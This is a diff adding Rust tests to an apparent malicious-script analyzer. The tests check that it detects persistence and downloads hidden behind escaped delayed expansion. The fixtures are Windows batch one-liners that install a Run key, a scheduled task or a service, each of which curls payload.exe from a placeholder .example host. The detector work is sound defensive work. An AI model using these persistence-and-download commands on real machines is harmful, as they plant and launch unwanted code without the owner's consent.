@@ -2564,6 +2564,26 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v updater /d "%COM
     }
 
     #[test]
+    fn reg_add_comspec_run_key_preserves_escaped_delayed_expansion() {
+        let script = br#"@echo off
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v updater /d "%COMSPEC% /V:ON /c set U=https://reg-escaped-comspec.example/payload.exe&&curl -o payload.exe ^!U^!" /f
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://reg-escaped-comspec.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "persisted escaped COMSPEC Run-key command download missing: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn powershell_run_key_itemproperty_emits_persistence_trait() {
         let script = br#"powershell -Command "New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name Updater -Value 'cmd.exe /c calc.exe' -PropertyType String -Force"
 "#;
@@ -3233,6 +3253,26 @@ schtasks /create /tn Updater /tr "%COMSPEC% /V:ON /c set U=https://schtasks-coms
                         && dst.as_deref() == Some("payload.exe")
             )),
             "persisted COMSPEC scheduled-task command download missing: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn schtasks_comspec_task_run_preserves_escaped_delayed_expansion() {
+        let script = br#"@echo off
+schtasks /create /tn Updater /tr "%COMSPEC% /V:ON /c set U=https://schtasks-escaped-comspec.example/payload.exe&&curl -o payload.exe ^!U^!" /sc once /st 00:00 /f
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://schtasks-escaped-comspec.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "persisted escaped COMSPEC scheduled-task command download missing: {:?}\n{}",
             report.traits,
             report.deobfuscated
         );
@@ -50073,6 +50113,34 @@ mod service_install_tests {
             )),
             "service binPath child command was not analyzed: {:?}",
             report.traits
+        );
+    }
+
+    #[test]
+    fn sc_create_comspec_binpath_preserves_escaped_delayed_expansion() {
+        let script = br#"sc create UpdateSvc binPath= "%COMSPEC% /V:ON /c set U=https://sc-escaped-comspec.example/payload.exe&&curl -o payload.exe ^!U^!""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ServiceInstall { service_name, bin_path }
+                    if service_name == "UpdateSvc"
+                        && bin_path.contains("%COMSPEC% /V:ON /c set U=")
+            )),
+            "service install trait missing: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://sc-escaped-comspec.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "escaped COMSPEC service binPath child command was not analyzed: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
         );
     }
 
